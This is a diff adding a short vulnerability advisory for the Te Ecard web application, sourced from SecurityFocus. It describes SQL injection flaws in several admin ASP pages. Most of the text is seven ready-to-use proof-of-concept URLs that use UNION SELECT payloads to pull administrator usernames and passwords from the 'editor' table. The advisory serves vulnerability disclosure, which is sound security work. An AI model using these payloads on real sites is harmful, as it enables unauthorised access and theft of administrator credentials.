@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/29478/info
+
+Te Ecard is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input before using it in an SQL query.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+http://www.example.com/victim/lab/tecard/admin/pul.asp?gorev=duzenle&id=1+union+select+0,sifre,2+from+editor
+http://www.example.com/victim/lab/tecard/admin/pul.asp?gorev=duzenle&id=1+union+select+0,kullanici_adi,2+from+editor
+http://www.example.com/tecard/admin/card.asp?gorev=duzenle&id=99999+union+select+0x31,null,2,3,sifre,5,6,kullanici_adi,5,0+from+editor+where+id=1
+http://www.example.com/lab/tecard/admin/midi.asp?gorev=duzenle&id=1+union+select+0,1,kullanici_adi,3,4,sifre+from+editor
+http://www.example.com/lab/tecard/admin/cat.asp?gorev=duzenle&id=1+union+select+kullanici_adi,1,sifre,3,4,5+from+editor
+http://www.example.com/lab/tecard/admin/fon.asp?gorev=duzenle&id=1+union+select+0,sifre,2+from+editor
+http://www.example.com/lab/tecard/admin/fon.asp?gorev=duzenle&id=1+union+select+0,kullanici_adi,2+from+editor 
